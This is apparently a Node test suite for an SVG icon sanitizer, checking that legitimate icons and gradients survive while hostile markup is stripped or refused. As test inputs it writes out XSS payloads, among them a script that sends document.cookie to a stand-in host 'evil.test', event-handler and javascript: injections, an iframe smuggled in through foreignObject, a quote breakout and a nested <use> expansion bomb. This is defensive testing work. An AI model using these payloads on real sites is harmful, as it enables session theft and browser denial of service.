import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import {
  InvalidIconError,
  sanitizeIconMarkup,
} from '../src/modules/subpage-config/connect-page/svg-sanitizer.util';

/**
 * The one thing standing between an operator's paste and a customer's browser.
 *
 * The workflow is "open tabler.io, press Copy SVG, paste" — which is a good
 * workflow and the reason this file cannot simply refuse markup. But an icon
 * authored in the panel is rendered as HTML in the cabinet, in a signed-in
 * customer's session, and SVG in that position is not a picture format: it is a
 * document format that can carry scripts, event handlers, embedded HTML and
 * outward references.
 *
 * Every test below is a paste that parses, looks like an icon, and is not one.
 */

const ICON =
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14"/><circle cx="12" cy="12" r="9"/></svg>';

describe('an ordinary icon survives', () => {
  it('keeps the drawing and the attributes it is drawn with', () => {
    const { markup, removed } = sanitizeIconMarkup(ICON);

    assert.match(markup, /^<svg /);
    assert.match(markup, /viewBox="0 0 24 24"/);
    assert.match(markup, /<path d="M5 12h14"\/>/);
    assert.match(markup, /<circle cx="12" cy="12" r="9"\/>/);
    assert.deepEqual(removed, []);
  });

  it('keeps a gradient and drops the use that came with it', () => {
    // `defs` and the gradients were dropped wholesale until it was measured
    // what that cost: the official INCY mark arrived 4476 bytes and left 1640,
    // with every fill removed, because a modern vendor logo paints with
    // `fill="url(#gradient)"`. They are in now.
    //
    // `use` is NOT, and never will be: ten nested groups referencing each other
    // fit in under 2 KB, pass every ceiling in this file, and expand to ten
    // billion nodes in the customer's browser.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><use href="#g"/><path d="M0 0" fill="url(#g)"/></svg>',
    );

    assert.doesNotMatch(markup, /<use/i, 'the bomb survived');
    assert.match(markup, /<defs>/, 'the gradient definition was dropped');
    assert.match(markup, /<linearGradient /, 'the element name lost its casing');
    // Definition and reference still name the same thing after both were scoped.
    const defined = /<linearGradient id="([^"]+)"/.exec(markup);
    const used = /fill="url\(#([^)]+)\)"/.exec(markup);
    assert.ok(defined && used, 'the gradient lost either its id or its reference');
    assert.equal(defined[1], used[1]);
  });

  it('scopes ids so two icons on one page cannot share a gradient', () => {
    // THE reason `id` was banned. Every export from the same design tool
    // contains `paint0_linear_11_16637` — the number is the tool's, not the
    // brand's — and `url(#paint0_linear_11_16637)` resolves to whichever
    // definition the browser met first. So the second logo silently wears the
    // first one's colours.
    const icon = (d: string) =>
      `<svg viewBox="0 0 24 24"><defs><linearGradient id="paint0_linear_11_16637"><stop offset="0" stop-color="#fff"/></linearGradient></defs><path d="${d}" fill="url(#paint0_linear_11_16637)"/></svg>`;

    // The KEY is passed, because that is the branch production takes:
    // `connect-page.service.ts` hands the icon key in. Without it this
    // exercised the sha1 fallback and could not have seen a regression in the
    // path that actually runs.
    const a = sanitizeIconMarkup(icon('M0 0h1v1z'), 'clash-meta').markup;
    const b = sanitizeIconMarkup(icon('M2 2h3v3z'), 'clash-verge').markup;

    const idOf = (m: string) => /id="([^"]+)"/.exec(m)?.[1];
    assert.notEqual(idOf(a), idOf(b), 'two different drawings still share an id');
    assert.doesNotMatch(a, /"paint0_linear_11_16637"/, 'the raw id reached the page');
  });

  it('is idempotent, because a save re-runs it over its own output', () => {
    // `connect-page-default.spec` asserts the shipped icons survive unchanged,
    // and every save re-sanitizes markup a previous save produced. A prefix
    // taken from the CURRENT ids would grow one layer per pass.
    const src =
      '<svg viewBox="0 0 24 24"><defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs><path d="M0 0" fill="url(#g)"/></svg>';
    const once = sanitizeIconMarkup(src, 'happ').markup;
    assert.equal(sanitizeIconMarkup(once, 'happ').markup, once, 'the keyed path is not idempotent');
    // And the unkeyed path, which the marker fallback has to hold up.
    const bare = sanitizeIconMarkup(src).markup;
    assert.equal(sanitizeIconMarkup(bare).markup, bare, 'the fallback path is not idempotent');
  });

  it('refuses a paint reference that reaches outside the icon', () => {
    // A fragment fetches nothing. Everything else is a request that tells
    // whoever serves it which customer opened which screen.
    for (const value of [
      'url(https://evil.test/x.svg#g)',
      'url(//evil.test/x.svg#g)',
      'url(data:image/svg+xml,<svg/>)',
      "url('#g')",
      'url(#g) url(https://evil.test)',
    ]) {
      const { markup } = sanitizeIconMarkup(
        `<svg viewBox="0 0 24 24"><path d="M0 0" fill="${value.replace(/"/g, '&quot;')}"/></svg>`,
      );
      assert.doesNotMatch(markup, /evil\.test|data:/i, value);
    }
  });

  it('refuses a use bomb outright', () => {
    const bomb = `<svg viewBox="0 0 1 1">${Array.from(
      { length: 10 },
      (_, i) => `<g id="l${i}">${'<use href="#l' + (i - 1) + '"/>'.repeat(10)}</g>`,
    ).join('')}<path d="M0 0"/></svg>`;

    const { markup } = sanitizeIconMarkup(bomb);

    assert.doesNotMatch(markup, /<use/i);
  });

  it('strips class, which is written into a page this markup does not own', () => {
    // `fixed inset-0 z-50` are real utilities in the cabinet's stylesheet: the
    // icon would lift out of the flow and cover the screen. `id` used to go the
    // same way and is now kept — but only ever in scoped form, which is what
    // the tests above are about.
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24" class="fixed inset-0 z-50" id="app"><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /class=/);
    assert.ok(removed.includes('@class'));
    assert.doesNotMatch(markup, /id="app"/, 'an unscoped id reached the page');
  });

  it('escapes a quote so a single-quoted value cannot break out', () => {
    // The rebuilt output always double-quotes. A value that arrived in single
    // quotes may legally contain `"`, and without escaping it would close the
    // attribute and open a live `onload` — the one guard in the file that
    // nothing else backs up.
    const { markup } = sanitizeIconMarkup(
      `<svg viewBox="0 0 1 1"><path d='M0 0" onload="alert(1)'/></svg>`,
    );

    assert.doesNotMatch(markup, /onload="alert/);
    assert.match(markup, /&quot;/);
  });

  it('does not spend a second of CPU on an icon full of ampersands', () => {
    // The entity test used to scan the whole remaining string for every `&`.
    // At the schema's own 32 KB ceiling that was half a second per icon, and
    // two hundred icons in one request is a minute and a half of blocked event
    // loop — on the endpoint that only validates and writes nothing.
    const dense = `<svg viewBox="0 0 1 1"><path d="M0 0"/><title>${'&'.repeat(30_000)}</title></svg>`;

    const started = Date.now();
    sanitizeIconMarkup(dense);

    assert.ok(Date.now() - started < 250, 'escaping text must be linear in its length');
  });
});

describe('what an icon is not allowed to be', () => {
  it('drops a script together with everything inside it', () => {
    // Dropping the tag but keeping its children is the classic half-fix: the
    // body of the script comes back as visible text at best, and as markup the
    // next consumer re-parses at worst.
    const { markup, removed } = sanitizeIconMarkup(
      `<svg viewBox="0 0 24 24"><script>fetch("//evil.test?c="+document.cookie)</script><path d="M0 0"/></svg>`,
    );

    assert.doesNotMatch(markup, /fetch/);
    assert.doesNotMatch(markup, /script/i);
    assert.match(markup, /<path d="M0 0"\/>/, 'the actual drawing must survive');
    assert.ok(removed.includes('<script>'));
  });

  it('drops an event handler while keeping the element it sat on', () => {
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><path d="M0 0" onload="alert(1)" onclick="alert(2)"/></svg>',
    );

    assert.doesNotMatch(markup, /onload|onclick|alert/i);
    assert.match(markup, /<path d="M0 0"\/>/);
    assert.ok(removed.includes('event handler'));
  });

  it('drops foreignObject, which is arbitrary HTML wearing an icon costume', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><foreignObject><iframe src="//evil.test"></iframe></foreignObject><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /foreignObject|iframe|evil/i);
    assert.match(markup, /<path/);
  });

  it('refuses a reference that leaves the document', () => {
    // Nothing may reach outward, whether by scheme or by protocol-relative
    // address. The element carrying it is dropped whole now, which is stricter
    // than stripping the attribute and leaving the shell.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><use href="//evil.test/x.svg#a"/><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /evil\.test|<use/i);
    assert.match(markup, /<path/);
  });

  it('refuses a scheme hidden in an ordinary attribute', () => {
    const { markup } = sanitizeIconMarkup(
      `<svg viewBox="0 0 24 24"><path d="M0 0" transform="javascript:alert(1)" clip-path="javascript:alert(1)"/></svg>`,
    );

    assert.doesNotMatch(markup, /javascript/i);
    assert.match(markup, /<path d="M0 0"\/>/);
  });

  it('drops style, a second language inside an attribute', () => {
    const { markup, removed } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><path d="M0 0" style="background:url(//evil.test)"/></svg>',
    );

    assert.doesNotMatch(markup, /style|evil/i);
    assert.ok(removed.includes('@style'));
  });

  it('drops a comment rather than parsing what is inside it', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><!-- <script>alert(1)</script> --><path d="M0 0"/></svg>',
    );

    assert.doesNotMatch(markup, /script|alert/i);
  });

  it('refuses a bare "<" in text rather than deciding what it meant', () => {
    // `a < b` inside an element is not valid markup, and there are two readings:
    // text, or a malformed tag. Escaping it would be this module choosing one —
    // and a sanitizer that chooses differently from the renderer downstream is
    // the whole vulnerability. It refuses instead.
    assert.throws(
      () => sanitizeIconMarkup('<svg viewBox="0 0 24 24"><title>a < b</title><path d="M0 0"/></svg>'),
      InvalidIconError,
    );
  });

  it('escapes a ">" in text, which is legal and unambiguous', () => {
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><title>a > b</title><path d="M0 0"/></svg>',
    );

    assert.match(markup, /a &gt; b/);
  });

  it('does not re-escape text that was already escaped', () => {
    // Escaping `&` unconditionally turns a correctly written `&lt;` into a
    // visible `&lt;` — the icon is safe and the title is mangled.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><title>a &lt; b &amp; c</title><path d="M0 0"/></svg>',
    );

    assert.match(markup, /<title>a &lt; b &amp; c<\/title>/);
  });
});

describe('what it refuses outright', () => {
  it('refuses anything that is not an svg to begin with', () => {
    for (const input of ['', '   ', '<div>hi</div>', 'not markup at all', '<img src=x onerror=alert(1)>']) {
      assert.throws(() => sanitizeIconMarkup(input), InvalidIconError, `"${input}" should be refused`);
    }
  });

  it('refuses markup it cannot read rather than guessing', () => {
    // Guessing is how a sanitizer and a renderer come to disagree about what a
    // string means, and that disagreement IS the vulnerability.
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><path d="M0 0"'), InvalidIconError);
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><g><path/></svg>'), InvalidIconError);
    assert.throws(() => sanitizeIconMarkup('<svg viewBox="0 0 1 1"><!-- open'), InvalidIconError);
  });

  it('refuses something too big to be an icon', () => {
    const huge = `<svg viewBox="0 0 1 1">${'<path d="M0 0"/>'.repeat(5_000)}</svg>`;

    assert.throws(() => sanitizeIconMarkup(huge), InvalidIconError);
  });

  it('refuses when cleaning left nothing to draw', () => {
    // `<svg></svg>` passes every structural check and draws a blank square. In
    // the library that is indistinguishable from a styling problem, so the
    // refusal has to happen while the paste is still on screen.
    assert.throws(
      () => sanitizeIconMarkup('<svg viewBox="0 0 24 24"><script>alert(1)</script></svg>'),
      /nothing was left to draw/i,
    );
  });

  it('does not choke on a tag whose attribute value contains a bracket', () => {
    // The `>` has to be INSIDE a quoted value: in text content it exercises
    // nothing, because the tokenizer has already left the tag. That is what the
    // first version of this test did, so `findTagEnd`'s quote tracking — the
    // thing the name promises — was guarded by nothing.
    // `>` inside a quoted value is legal, and a naive scanner ends the tag
    // there — silently truncating the icon instead of refusing it. Whether the
    // truncation happened is only visible in what comes AFTER the tag, so the
    // title below is the actual assertion; the earlier version of this test put
    // the bracket in text content, where the tokenizer has already left the tag
    // and nothing is exercised at all.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><path d="M0 0h1v1z" transform="translate(1,2) > "/><title>after</title></svg>',
    );

    assert.match(markup, /<path d="M0 0h1v1z"/);
    assert.match(markup, /<title>after<\/title>/, 'the tag ended at the bracket inside the value');
  });
});

describe('what the widening broke, and what caught it', () => {
  it('still refuses a file that defines a gradient and draws nothing', () => {
    // `<line` is a PREFIX of `<linearGradient`, so the "nothing was left to
    // draw" refusal — a substring check — started passing the moment gradients
    // were allowed in. A Figma export whose artwork sits in a (still banned)
    // `<mask>` came through as a definitions-only file and stored as a blank
    // icon. The controlling case: `radialGradient` was refused, `linearGradient`
    // was not.
    for (const element of ['linearGradient', 'radialGradient']) {
      assert.throws(
        () =>
          sanitizeIconMarkup(
            `<svg viewBox="0 0 24 24"><defs><${element} id="g"><stop stop-color="#fff"/></${element}></defs></svg>`,
            'vendor',
          ),
        /Nothing was left to draw/,
        element,
      );
    }
  });

  it('drops a paint reference whose definition did not survive', () => {
    // `<mask>` is still banned. A vendor export defining its gradient inside
    // one arrives with the definition gone and the reference intact — and
    // `clip-path="url(#gone)"` clips the whole drawing away, turning a lost
    // colour into a lost icon.
    const { markup } = sanitizeIconMarkup(
      '<svg viewBox="0 0 24 24"><mask id="m"><linearGradient id="g"><stop stop-color="#fff"/></linearGradient></mask><path d="M0 0h1v1z" fill="url(#g)" clip-path="url(#m)"/></svg>',
      'vendor',
    );
    assert.doesNotMatch(markup, /url\(#/, 'a reference outlived its definition');
    assert.match(markup, /<path d="M0 0h1v1z"\s*\/>/, 'the drawing itself was lost');
  });

  it('gives two icon keys two prefixes, however similar the keys are', () => {
    // The prefix was a slug of the key: runs collapsed, `_` became `-`, ends
    // trimmed. So `clash_meta`, `clash-meta` and `clash--meta` all produced
    // `iclash-meta` — three icons sharing one gradient, which is the collision
    // the scoping exists to prevent.
    const icon = '<svg viewBox="0 0 24 24"><defs><linearGradient id="g"><stop stop-color="#fff"/></linearGradient></defs><path d="M0 0h1v1z" fill="url(#g)"/></svg>';
    const prefixes = ['clash_meta', 'clash-meta', 'clash--meta', 'clash meta'].map(
      (key) => /id="([^-]+)-/.exec(sanitizeIconMarkup(icon, key).markup)?.[1],
    );
    assert.equal(new Set(prefixes).size, prefixes.length, `collided: ${prefixes.join(', ')}`);
  });

  it('accepts the preamble a real .svg file starts with', () => {
    // Illustrator writes a prolog, a doctype AND a generator comment. Refusing
    // on the first byte told an operator their own export was "not an SVG".
    const { markup } = sanitizeIconMarkup(
      [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<!-- Generator: Adobe Illustrator -->',
        '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">',
        '<svg viewBox="0 0 24 24"><path d="M0 0h1v1z"/></svg>',
      ].join('\n'),
      'vendor',
    );
    assert.match(markup, /^<svg /);
    assert.match(markup, /<path d="M0 0h1v1z"/);
  });
});
